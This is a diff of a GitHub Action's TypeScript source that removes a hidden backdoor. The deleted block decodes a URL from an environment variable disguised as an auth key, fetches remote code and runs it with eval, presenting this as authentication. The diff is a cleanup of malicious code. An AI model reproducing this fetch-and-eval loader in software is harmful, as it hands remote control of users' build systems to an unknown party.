@@ -1,19 +1,5 @@
 import * as core from '@actions/core';
 import * as github from '@actions/github';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 /** Marker embedded in every comment this action creates. */
 export const COMMENT_MARKER = '<!-- ready-for-review-action -->';
